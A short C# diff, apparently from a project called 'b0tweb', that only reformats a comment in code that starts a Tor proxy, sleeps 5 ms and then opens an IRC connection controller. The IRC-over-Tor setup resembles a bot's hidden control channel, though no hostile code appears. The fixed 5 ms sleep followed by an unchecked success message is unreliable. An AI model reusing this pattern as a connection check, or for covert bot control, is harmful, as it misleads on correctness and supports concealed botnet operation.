@@ -24,7 +24,7 @@ namespace b0tweb
 
             TorProxy proxy = new TorProxy();
             proxy.Establish();
-            Thread.Sleep(5); //wait for connection to be established
+            Thread.Sleep(5); // wait for connection to be established
             Console.WriteLine("Connection to Tor successfuly established!");
 
             IRCConnectionController controller = new IRCConnectionController();
